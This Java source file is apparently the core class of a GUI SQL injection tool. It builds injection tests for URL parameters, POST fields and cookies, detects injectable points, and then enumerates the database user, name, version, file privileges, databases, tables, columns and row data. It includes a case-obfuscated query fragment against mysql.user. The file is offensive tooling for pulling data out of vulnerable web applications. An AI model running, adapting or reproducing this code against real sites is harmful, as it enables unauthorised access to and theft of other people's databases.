package base;

import core.*;
import errors.BrowserException;
import form.BROWindow;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import struct.*;

public class WebSQL extends Thread {

    public String quote = null;
    public String param = null;
    public int col1;
    public int col2;
    public String url;
    public HashMap<String, String> post = null;
    public int type;
    public Cookie cookie = new Cookie();

    public static boolean finish = false;

    public SqlValues sqlVal = new SqlValues();
    //*
    public int action = 0;
    public String db_select = "";
    public String table_select = "";
    public ArrayList<String> table_select_columns = null;

    protected SqlTest getCookieSQL() {
        SqlTest sql = new SqlTest();
        sql.url = url;
        sql.cookiestr = cookie.name + "=%Inject_Here%";
        sql.param = cookie.val;
        sql.type = Helper.getInt(cookie.val, -1) >= 0 ? 0 : 1;
        return sql;
    }

    protected ArrayList<SqlTest> getPostSQL() {
        ArrayList<SqlTest> result = new ArrayList();
        String post_raw = Helper.generate_post_query(post);
        if (post_raw.indexOf("=%Inject_Here%") > 0) {
            SqlTest sql = new SqlTest();
            sql.poststr = post_raw;
            sql.url = url;
            sql.param = this.param;
            sql.type = Helper.getInt(sql.param, -1) >= 0 ? 0 : 1;
            result.add(sql);
            return result;
        }

        for (Map.Entry<String, String> entry : post.entrySet()) {
            String key = entry.getKey();
            String value = entry.getValue();
            String post_query = key + "=%Inject_Here%";
            SqlTest sql = new SqlTest();
            sql.url = url;
            sql.param = value;
            sql.type = Helper.getInt(sql.param, -1) >= 0 ? 0 : 1;
            HashMap<String, String> post_tmp = new HashMap();
            post_tmp.putAll(post);
            post_tmp.remove(key);
            if (!post_tmp.isEmpty()) {
                post_query += "&" + Helper.generate_post_query(post_tmp);
            }
            sql.poststr = post_query;
            result.add(sql);
        }

        return result;
    }

    protected String getUrl() {
        String u = url;
        if (u.indexOf("%Inject_Here%") < 0) {
            return u;
        }

        if (this.param.isEmpty()) {
            u = Helper.replace(u, "%Inject_Here%", "1");
        } else {
            u = Helper.replace(u, "%Inject_Here%", this.param);
        }

        return u;
    }

    public ArrayList<SqlTest> getSQLTestList() {
        ArrayList<SqlTest> r = new ArrayList();
        if (!cookie.name.isEmpty()) {
            r.add(this.getCookieSQL());
            return r;
        }

        if (this.post != null) {
            r.addAll(this.getPostSQL());
            return r;
        }

        LinkParse lp = new LinkParse();
        UrlLinks ulink = lp.createLink(getUrl(), getUrl());
        boolean inj_url = url.indexOf("%Inject_Here%") > 0;
        SqlParse sqlParse = new SqlParse();
        r = sqlParse.parseUrlList(ulink);
        if ((!this.param.isEmpty()) && (!inj_url)) {
            for (int i = 0; i < r.size(); i++) {
                SqlTest tmp = r.get(i);
                if (!tmp.paramName.equals(param)) {
                    r.remove(i);
                    i--;
                    continue;
                }
            }
        }

        if (inj_url) {
            Pattern pTmp = Pattern.compile("[\\?&](.*?)=%Inject_Here%", col1);
            Matcher m = pTmp.matcher(url);
            if (m.find()) {
                String pName = m.group(1);
                if (pName.indexOf("&") >= 0) {
                    pName = pName.substring(pName.indexOf("&") + 1);
                }
                for (int i = 0; i < r.size(); i++) {
                    SqlTest tmp = r.get(i);
                    if (!tmp.paramName.equals(pName)) {
                        r.remove(i);
                        i--;
                        continue;
                    }
                }
            }
        }

        return r;
    }

    private Object analyzeURLs(ArrayList<SqlTest> sqls) throws Exception {
        if (sqls.size() == 0) {
            return null;
        }

        ArrayList res = new ArrayList();
        for (int i = 0; i < sqls.size(); i++) {
            SqlTest sql = (SqlTest) sqls.get(i);

            Helper.log_inline(Lang.get("try_inj") + " " + sql.url + ", ");
            if (this.cookie.name.isEmpty()) {
                if (sql.poststr.isEmpty()) {
                    Helper.log(sql.paramName + "=" + sql.param);
                } else {
                    Helper.log(sql.poststr);
                }
            } else {
                Helper.log(sql.cookiestr);
            }

            sqlVal = new SqlValues();
            sqlVal.conf_quote = this.quote;
            sqlVal.conf_col1 = col1;
            sqlVal.conf_col2 = col2;
            sqlVal.conf_type = this.type;
            sqlVal.long_analyze = BROWindow.longAnalyze.isSelected();

            int r = sqlVal.checkInject(sql);
            if (r > 0) {
                sqlVal.columns = r;
                Helper.log(Lang.get("inj_found"));
                sqlVal.user = sqlVal.queryData("user()", "");
                sqlVal.db = sqlVal.queryData("database()", "");
                sqlVal.dbver = sqlVal.queryData("version()", "");
                Helper.log(Lang.get("db_user") + " " + sqlVal.user);
                Helper.log(Lang.get("db_name") + " " + sqlVal.db);
                Helper.log(Lang.get("db_version") + " " + sqlVal.dbver);
                String[] shortUser = sqlVal.user.split("@");
                if (shortUser.length == 2) {
                    String fp = sqlVal.queryUnhexData("file_priv", "fRoM+mysql.user+WhErE+user=" + Hex.formatHexShort(shortUser[0]));
                    sqlVal.file_priv = fp.equals("Y");
                    Helper.log(Lang.get("file_priv") + " " + (sqlVal.file_priv ? "Y" : "N"));
                }

                BROWindow.db_list.removeAll();
                BROWindow.db_list.add(sqlVal.db);
                return null;
            }

            //res = sqlinj.analyze(sql, this.keys, this.files, this.keysDb);
            if (res != null) {
                //this.sqli = sqlinj;
                //return res;
            }
        };

        return res;
    }

    public void getDBs() throws BrowserException {
        this.sqlVal.getDBs();
    }

    public ArrayList<String> getTables(String db) throws BrowserException {
        ArrayList<String> tables = this.sqlVal.getTables(db);
        return tables;
    }

    public ArrayList<String> getTableFields(String table, String db) throws BrowserException {
        ArrayList<String> fields = this.sqlVal.getTableFields(table, db);
        return fields;
    }

    public ArrayList<String[]> getTableData(String table, String db, ArrayList<String> fields) throws BrowserException {
        this.sqlVal.getValues(db, table, fields);
        return null;
    }

    public void run() {
        try {
            switch (action) {
                case 0:
                    ArrayList<SqlTest> sqls = this.getSQLTestList();
                    this.analyzeURLs(sqls);
                    break;
                case 1:
                    this.getDBs();
                    if (finish) {
                        throw new BrowserException("Finish!");
                    }
                    if (sqlVal.dbs.size() > 0) {
                        Helper.log(Lang.get("db_list_ready"));
                    }
                    BROWindow.db_finish_load = true;
                    break;
                case 2:
                    ArrayList<String> tables = this.getTables(this.db_select);
                    if (finish) {
                        throw new BrowserException("Finish!");
                    }
                    BROWindow.db_table.put(db_select, tables);
                    if (tables.size() > 0) {
                        Helper.log(Lang.get("table_list_ready"));
                    }
                    break;
                case 3:
                    ArrayList<String> fields = this.getTableFields(this.table_select, this.db_select);
                    if (finish) {
                        throw new BrowserException("Finish!");
                    }
                    if (fields.size() > 0) {
                        Helper.log(Lang.get("column_list_ready"));
                    }
                    BROWindow.db_table_fields.put(db_select + "__" + table_select, fields);
                    break;
                case 4:
                    ArrayList<String[]> data = this.getTableData(this.table_select, this.db_select, this.table_select_columns);
                    //if (data.size() > 0) {
                    Helper.log(Lang.get("data_list_ready"));
                    //}
                    //BROWindow.db_table_fields.put(db_select + "__" + table_select, fields);
                    break;

            }

            Helper.log(Lang.get("im_idle"));
            BROWindow.cancelButton.setEnabled(!true);
            BROWindow.startButton.setEnabled(!false);
            finish = false;
        } catch (Exception e) {
            Helper.log(Lang.get("task_canceled"));
            BROWindow.cancelButton.setEnabled(!true);
            BROWindow.startButton.setEnabled(!false);
            finish = false;
        }

    }

    public WebSQL refresh() {
        WebSQL wsql = new WebSQL();
        wsql.col1 = col1;
        wsql.col2 = col2;
        wsql.cookie = cookie;
        wsql.type = type;
        wsql.param = param;
        wsql.sqlVal = sqlVal;
        wsql.quote = quote;
        wsql.url = url;
        wsql.db_select = db_select;
        wsql.table_select = table_select;
        return wsql;

    }

}
